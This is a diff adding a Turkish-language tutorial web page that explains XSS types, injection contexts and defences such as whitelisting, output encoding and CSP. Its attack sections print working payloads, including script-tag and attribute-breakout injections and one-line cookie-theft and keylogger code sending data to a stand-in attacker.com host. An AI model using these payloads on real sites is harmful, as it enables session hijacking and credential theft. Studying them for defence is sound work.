@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="tr-TR">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="robots" content="index,follow" />
+		<meta name="description" content="Windows diskpart.exe nasıl kullanılır. Diskpart ile flash bellek formatlama" />
+		<meta name="keywords" content="diskpart, cmd, flashbellek, formatlama" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<title>XSS Nedir?</title>
+
+		<!--[if lt IE 9]>
+			<script src="../assets/js/html5shiv.js"></script>
+		<![endif]-->
+
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css" />
+		<link rel="stylesheet" type="text/css" href="../assets/css/inconsolata.css" />
+		<link rel="stylesheet" type="text/css" href="../assets/css/anonymous+pro.css" />
+
+	</head>
+
+
+	<body>
+		<div id="page">
+			<nav>
+				<a href="index.html">Arşiv</a>
+				<a href="log.html">.log</a>
+			</nav>
+
+		<section>
+			<h1>XSS Nedir? - Cross Site Scripting</h1>
+
+
+			<ol>
+				<li><a>XSS Nedir?</a></li>
+				<li><a>XSS Türleri Nelerdir?</a></li>
+				<ol>
+					<li>Reflected XSS</li>
+					<li>Stored XSS</li>
+					<li>Dom Based XSS</li>
+				</ol>
+				<li><a>XSS Saldırısı Nasıl Yapılır?</a>
+					<ol>
+						<li>Javascript Kodunun Sayfada Kullanıldığı Bağlamlar(Context)</li>
+						<li>Javascipt Kodu Nasıl Enjekte Edilir?</li>
+					</ol>
+				</li>
+				<li><a>XSS ile Neler Yapılabilir?</a>
+				<ol>
+					<li>XSS Cookie Hırsızlığı</li>
+					<li>XSS Keylogging</li>
+					<li>XSS Spear Phishing</li>
+				</ol>
+				</li>
+				<li>XSS Önleme Yöntemleri Nelerdir?</li>
+					<ol>
+						<li>BlackListing Classification (Kara Liste Sınıflandırması)</li>
+						<li>WhiteListing Classification (Beyaz Liste Sınıflandırması)</li>
+						<li>Validating Input/Output</li>
+						<li>Encoding Input/Output</li>
+						<li>Content Security Policy (CSP)</li>
+					</ol>
+				</li>
+			</ol>
+
+
+<h2>XSS Nedir?</h2>
+<p>XSS (Cross Site Scripting) bir kod enkejte saldırısıdır.</p>
+<p>Saldırganın bir web sayfasında, kendi istediği zararlı JavaScript kodunu çalıştırmasına izin verir.</p>
+<p>Saldırgan XSS açığı gördüğü yere Javascript kodunu enjekte ederek XSS zafiyetini sömürür.</p>
+
+<h2>XSS Türleri Nelerdir?</h2>
+<p>XSS türleri, saldırının yapılış yöntemine göre türlere ayrılır.</p>
+<ol>
+	<li>Reflected XSS</li>
+	<li>Stored XSS</li>
+	<li>Dom-Based Xss</li>
+</ol>
+
+<h3>Reflected XSS</h3>
+<section class="sub-section">
+	Zararlı Javascript kodu, http isteği içerisinde bulunur. Bir Link(bağlantı) üzerinden script tetiklenir.
+	<pre class="code">http://hedefwebsayfasi.com/?pageName=&lt;script&gt;alert(document.cookie);&lt;/script&gt;</pre>
+	<p>URL Encoded hali:</p>
+	<a href="http://hedefwebsayfasi.com/?pageName=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E">http://hedefwebsayfasi.com/?pageName=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E</a>
+</section>
+
+<h3>Stored XSS</h3>
+<section class="sub-section">
+	Zararlı Javascript kodu, hedef web sayfasının veritabanından gelir. Saldırgan zararlı javascript kodunu bir form veya api çağrısı üzerinden db'ye göndermiştir.
+	<p>Gönderilen zararlı kod, çağrılıp sayfada kullanıldığında stored-xss zafiyeti oluşmuş olur.</p>
+</section>
+
+<h3>Dom-Based XSS</h3>
+<section class="sub-section">
+	Zararlı Javascript kodu, client-side kodunda bulunur.
+</section>
+
+
+<h2>XSS Saldırısı Nasıl Yapılır?</h2>
+<p>Web sayfası, kullanıcıdan aldığı bilgilleri yine aynı web sayfasında ya da diğer sayfalarında kullanır. Eğer XSS açığı oluşturacak şekilde bu bilgiler web sayfasına basılırsa, XSS açığı meydana gelir. </p>
+
+<h3>Javascript Kodunun Sayfada Kullanıldığı Bağlamlar(Context)</h3>
+<section class="sub-section">
+<p>Kullanıcıdan alınan bir bilginin(input) web sayfasında kullanıldığını varsayalım. Alınan bu bilgi web sayfasında farklı bağlamlarda(context) kullanılabilir.</p>
+
+<ol>
+	<li>HTML element content</li>
+	<p>Input bilgisi, html etiketleri arasına yazdırılır.</p>
+<pre class="code">&lt;div&gt; <span style="color:red">(User Input)</span> &lt;/div&gt;</pre>
+<br />
+	<li>HTML attribute value</li>
+	<p>Input bilgisi html attribute olarak kullanılır.</p>
+<pre class="code">&lt;div style="<span style="color:red">(User Input)</span>" &gt; .. &lt;/div&gt;</pre>
+<br />
+	<li>URL query value</li>
+	<p>Input bilgisi, http isteğinden alınır.</p>
+	<pre class="code">http://example.com/?parametre=<span style="color:red">(User Input)</span></pre>
+	<br />
+	<li>CSS value</li>
+	<p>Input bilgisi, style değeri olarak kullanılır.</p>
+	<pre class="code">margin: <span style="color:red">(User Input)</span></pre>
+	<br />
+	<li>JavaScript value</li>
+	<p>Input bilgisi, sayfanın javascript kodları arasında kullanılır.</p>
+	<pre class="code">var name = "<span style="color:red">(User Input)</span>";</pre>
+	<br />
+</ol>
+
+<p>Zararlı javascript kodu, input olarak kullanıcıdan alınır ve yukarıdaki context'lerden birinde kullanılır.</p>
+<p>Kullanıcıdan alınan input kontrol edilmeden direk bu context'ler içerisinde kullanılırsa, saldırgan context'e uygun şekilde zararlı javascript kodunu enjekte edebilir.</p>
+</section>
+
+
+<h3>Javascipt Kodu Nasıl Enjekte Edilir?</h3>
+<section class="sub-section">
+	<p>Sayfamızın <q>title</q> adında bir url parametresi aldığını ve bunu client-side kodunda kullandığını düşünelim.</p>
+	<pre class="code">http://example.com/?title=<span style="color:green">(Sayfa Başlığı)</span></pre>
+	<p>Query string, sayfamızda aynen kullanıyor olsun.</p>
+	<pre class="code">
+&lt;h1&gt;<span style="color:green">&lt;?php echo $_GET[&quot;title&quot;]; ?&gt;</span>&lt;/h1&gt;</pre>
+
+
+<hr />
+<pre class="code">http://example.com/?title=<span style="color:green">Hoşgeldiniz</span></pre>
+<p>Sayfanın html çıktısı:</p>
+<pre class="code">&lt;h1&gt;<span style="color:green">Hoşgeldiniz</span>&lt;/h1&gt;</pre>
+
+
+
+<hr />
+<p><q>Hoşgeldiniz</q> dizesini değiştirerek sayfaya şu şekilde javascript kodu enjekte edebiliriz.</p>
+<pre class="code">http://example.com/?title=<span style="color:green">&lt;script&gt;alert(1)&lt;/script&gt;</span></pre>
+<p>Sayfanın html çıktısı:</p>
+
+<pre class="code">&lt;h1&gt;<span style="color:green">&lt;script&gt;alert(1)&lt;/script&gt;</span>&lt;/h1&gt;</pre>
+
+<p>Sayfamız bir alert gösterecektir. Bu örnekte XSS zaafiyetinin HTML element context alanında nasıl kullanıldığını gösterdik.</p>
+
+<p>Yukarıdaki örneği aşağıdaki adreste test edebilirsiniz.</p>
+<a href="https://xss-game.appspot.com/level1/frame" style="border-bottom: 1px dashed green;">Link: https://xss-game.appspot.com/level1/frame</a>
+<br />
+<img src="../assets/img/xss-game-frame1.png"/>
+
+
+
+	<h4>XSS Bypass ve Payload Kavramları</h4>
+
+	
+<pre class="code">&lt;h1&gt;<span style="color:green">&lt;script&gt;</span><span style="color:red">alert(1)</span><span style="color:green">&lt;/script&gt;</span>&lt;/h1&gt;</pre>
+
+	<ol>
+		<li><span style="color:green">Bypass Kodu</span></li>
+		<p>Bypass etmek, zararlı javascript kodunun sayfada çalışır hale gelmesini sağlamak için context'e uygun şekilde girdi göndermektir. Zararlı kodu sayfada çalışır hale getirecek kod parçasıdır.</p>
+		<li><span style="color:red">Payload Kodu</span></li>
+		<p>Zararlı javascript kodunu temsil eder.</p>
+	</ol>
+
+	<p>alert komutu, sayfada XSS zaafiyetinin olduğunu ıspatlamanın en hızlı yöntemlerinden birisi olduğu için kullanılmıştır. Amacımız sayfada javascript kodu çalıştırabilmektir.</p>
+
+
+
+<h4>Html Attribute Context İçerisine Javascipt Enjekte Etmek</h4>
+
+<pre class="code">http://example.com/?style=<span style="color:green">(Başlık Rengi)</span></pre>
+<p>Query string, sayfamızda aynen kullanıyor olsun.</p>
+<pre class="code">
+&lt;h1 style="color:<span style="color:green">&lt;?php echo $_GET[&quot;style&quot;]; ?&gt;</span>" &gt;&lt;/h1&gt;</pre>
+
+
+<hr />
+<pre class="code">http://example.com/?title=<span style="color:green">green</span></pre>
+<p>Sayfanın html çıktısı:</p>
+<pre class="code">&lt;h1 style="color:<span style="color:green">green</span>" &gt;&lt;/h1&gt;</pre>
+
+
+
+<hr />
+<pre class="code">http://example.com/?title=<span style="color:green">" onclick="alert(1)" "</span></pre>
+<p>Sayfanın html çıktısı:</p>
+<pre class="code">&lt;h1 style="color:<span style="color:green">" onclick="alert(1)" "</span>" &gt;&lt;/h1&gt;</pre>
+
+<p>Bypass Kodu: </p>
+<pre class="code"><span style="color:green">" [Payload] "</span></pre>
+
+<p>Payload: </p>
+<pre class="code"><span style="color:red">onclick="alert(1)"</span></pre>
+	</section>
+
+
+
+<h2>XSS ile Neler Yapılabilir?</h2>
+<p>Javascript ile web sayfasında yapılabilen her şey yapılabilir.</p>
+<p>Javascript ile, tüm web sayfasının içeriği kolaylıkla değiştirilebilir, kontrol edilebilir. Saldırgan web sayfasını istediği şekilde manipule edebilir.</p>
+<p>Ancak buna rağmen XSS açığı genelde şu şekillerde kullanılır:</p>
+<ol>
+	<li>XSS Cookie Hırsızlığı</li>
+	<li>XSS Keylogging</li>
+	<li>XSS Spear Phishing (Hedef Odaklı Oltalama)</li>
+</ol>
+
+<h3>XSS Cookie Hırsızlığı</h3>
+<section class="sub-section">
+	<p>Saldırgan, kullanıcının oturum(session) bilgilerini aşağıdaki javascript kodu ile okuyabilir.</p>
+	<pre class="code">document.cookie</pre>
+
+	<p>Zararlı javascript kodu çalıştırabilir hale geldikten sonra, sayfa içerisinde istediği bir src attribute kullanarak, oturum bilgilerini kendisine gönderebilir.</p>
+	<pre class="code">document.getElementById("resim").src="http://attacker.com/?cookie="+document.cookie;</pre>
+</section>
+
+<h3>XSS Keylogging</h3>
+<section class="sub-section">
+	<p>Saldırgan, sayfaya yeni bir javascript eventi ekleyebilir. Eklediği event kullanıcının bastığı her tuşu kaydedebilir ve saldırganın istediği adrese bu tuş kayıtları gönderilir.</p>
+	<p>Sayfada kullanıcıdan hassas bilgiler alınıyorsa, bu bilgiler saldırganın eline geçebilir. Hesap numarası, login bilgileri vs.</p>
+	
+	<p>Aşağıdaki örnekte sayfamızda id değeri <q>resim</q> olan bir <q>img</q> etiketimiz olsun.</p>
+	<p>Örnek Javascript KeyPress Eventi</p>
+	<pre class="code">
+onkeypress=(e)=&gt;{document.getElementById("resim").src="http://attacker.com?c="+e.key;};</pre>
+<br />
+	<p>Sayfada JQuery kullanılıyorsa, aşağıdaki şekilde bir onkeypress eventi rahatlıkla eklenebilir.</p>
+	<pre class="code">onkeypress=(e)=&gt;{$("#resim").attr("src","http://attakcer.com?c="+e.key);}</pre>
+	<p>Saldırgan kendi web sayfasında <q>c</q> query string'ine gelen karakterleri yakalar.</p>
+<p>Bu varyasyonlar çeşitlendirilebilir ve daha sofistike keyloggerlar sayfaya eklenebilir.</p>
+<br />
+
+<h4>Neden XHR Kullanmıyoruz?</h4>
+<p>XHR - Xml Http Request, web sayfamızdan http isteklerini atmamızı sağlayan bir yapıdır. Ajax ve API çağrımlarımlarında kullanılır.</p>
+<p>Ancak sayfada CSP ve CORS mevcut olduğundan sayfalar XHR izni vermezler.</p>
+</section>
+
+<h3>XSS Spear Phishing</h3>
+<section class="sub-section">
+<p>Sayfada zararlı kod çalıştırılabildiği için, saldırgan sayfada istediği değişikliği yapabilir. Kurban güvenli bir web sayfasında olduğunu düşünebilir ancak, web sayfası xss barındırıyorsa, ve saldırgan bu xss'i sömürmeyi başarabilmiş ise, web sayfasındaki kullanıcıya sahte bir login formu gösterebilir.</p>
+<p>Kullanıcı güvenli olduğunu düşündüğü sitede, oturum açması gerektiğini düşünebilir ve bu forma kendi giriş bilgilerini girebilir. Girilen bilgilerin doğrudan saldırgana iletilmesi sağlanabilir.</p>
+<p>Saldırgan balık tutar gibi kurbanın bilgilerini ele geçirir. Kurban ise oltaya takılmıştır. Bu yüzden bu saldırı türüne oltalama saldırısı denir.</p>
+
+</section>
+
+
+
+
+
+
+<h2>XSS Önleme Yöntemleri Nelerdir?</h2>
+<ol>
+	<li>Sınıflandırma</li>
+<li>Validating Input/Output</li>
+<li>Encoding Input/Output</li>
+<li>CSP - Content Security Policy</li>
+
+</ol>
+
+
+<h3>BlackListing Classification (Kara Liste Sınıflandırması)</h3>
+<section class="sub-section">
+	<p>İstenmeyen kullanıcı girdilerinin bir listesi hazırlanır, kullanıcıdan alınan girdi, bu listede var ise girdi zararlı kabul edilir.</p>
+	<p>Ancak bu yöntemin 2 dezavantajı vardır:</p>
+	<ol>
+		<li>Complexty (Karmaşıklık)</li>
+<p>Tüm mümkün kötü niyetli dizelerin doğru bir şekilde tanımlanması genellikle çok karmaşık bir görevdir. 
+	Mesela, <q>javascript</q> ile başlayan dizeyi kara listemize alsak bile "Javascript:" (ilk harfi büyük olan) ve "javascript:" (ilk harfi sayısal karakter referansı olarak kodlanmış) gibi dize türlerini kaçırır. </p>
+
+
+		<li>Staleness</li>
+		<p> Mükemmel bir kara liste bile olsa, tarayıcıya zararlı kullanım izni veren yeni bir özellik eklendiğinde başarısız olacaktır. Örneğin, HTML5 onmousewheel özniteliğinin tanıtımından önce geliştirilen bir HTML doğrulama kara listesi, bir saldırganın XSS saldırısı gerçekleştirmek için bu özniteliği kullanmasını engelleyemeyecektir. Bu dezavantaj, sürekli güncellenen birçok farklı teknolojiden oluşan web geliştirme açısından özellikle önemlidir.</p>
+	</ol>
+
+<p>Bu dezavantajlardan dolayı, bir sınıflandırma stratejisi olarak kara liste önerilmez. Bu yüzden beyaz liste yaklaşımı önerilir.</p>
+
+</section>
+
+
+
+
+<h3>WhiteListing Classification (Beyaz Liste Sınıflandırması)</h3>
+<section class="sub-section">
+<p>Beyaz liste kullanmanın avantajları şunlardır:</p>
+<ol>
+	<li>Basitlik</li>
+	<p>İzin verilen kalıpların kümesi, yasaklanan kalıplar kümesinden çok daha küçük ve daha kolay tanımlanabilir, bu da doğrulama mantığının uygulanmasını daha basit ve daha doğru hale getirir.</p>
+	
+	<li>Güvenlik</li>
+	<p>Beyaz liste oluşturma, yalnızca güvenli kabul edilen girdilerin kabul edilmesini sağlar ve böylece bir saldırı riskini azaltır.</p>
+
+	<li>Gelecek için hazılık</li>
+	<p> Beyaz liste oluşturma, belirli bir izin verilen kalıplar kümesine dayandığından, tarayıcılara veya diğer teknolojilere yeni özellikler eklenirken eskimesi daha az olasıdır.</p>
+</ol>
+
+
+</section>
+
+
+
+<h3>Validating Input/Output</h3>
+<section class="sub-section">
+<p>Kullanıcı girdileri kontrol edilir ve bunun sonucunda iki aksiyondan birisi alınır.</p>
+<ol>
+	<li>Reddetme(Rejection)</li>
+	<p>Zararlı olduğu kabul edilen bir dizi geldiği zaman girdi reddedilir ve web sayfasında kullanılmaz.</p>
+	<li>Temizleme(Sanitisation)</li>
+	<p>Girdinin zararlı kısımları temizlenerek, girdinin kalan kısımları kontrol edilir. (ör: Cep telefonu numarasındaki tire(-) lerin temizlenip sadece rakamların alınması)</p>
+</ol>
+</section>
+
+
+<h3>Encoding Input/Output</h3>
+<section class="sub-section">
+<p>Girdilerin kullanıldığı yerlere göre encoding edilip context'e uygun hale getirilmeleri gerekir. Yoksa XSS zaafiyeti doğabilir.</p>
+<p>Kullanıcı girdisi çıktılanmak istendiğinde, context'e göre bir encoding uygulanmalıdır.</p>
+</section>
+
+
+
+<h3>CSP - Content Security Policy - İçerik Güvenlik Politikası</h3>
+<section class="sub-section">
+<p>Web sayfasında set edilen HTTP Header'da, hangi kaynakların güvenli kaynak olarak kabul edileceği belirtilir.</p>
+<p>Web tarayıcısı(browser) gelen response'daki CSP header'ından bu veriyi okur, çalıştırılmak istenen javascript kodunun CSP header'ında belirtilen kaynaktan gelip gelmediğini kontrol eder.</p>
+<p>Tarayıcı farklı bir kaynaktan gelen javascript kodunu çalıştırmaz.</p>
+<p>CSP, sayfanızı görüntüleyen tarayıcıyı yalnızca güvenilir kaynaklardan indirilen kaynakları kullanmakla kısıtlamak için kullanılır. Kaynak, sayfa tarafından kullanılan bir betik, bir stil sayfası, bir resim veya başka bir dosya türüdür. Bu, saldırganın web sitenize zararlı içerik enjekte etmeyi başarsa bile, 
+	CSP sayesinde bunun hiçbir zaman yürütülmemesini anlamına gelir.</p>
+
+	<p>Content-Security-Policy meta etiketiyle de sayfaya eklenebilir.</p>
+<pre class="code">
+&lt;meta
+http-equiv=&quot;Content-Security-Policy&quot;
+content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot; /&gt;
+</pre>
+
+</section>
+
+		<br />
+		<p style="border-top: 1px dashed green;"></p>
+		<p>Kaynak: https://developer.mozilla.org/en-US/docs/Web/API/Element/keypress_event</p>
+		<p>Kaynak: https://github.com/beefproject/beef/wiki/Configuration</p>
+		<p>Kaynak: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</p>
+		<p>Kaynak: https://excess-xss.com/#xss-attacks</p>
+		</section>
+
+		</div><!--page-->
+
+
+
+	</body>
+</html>
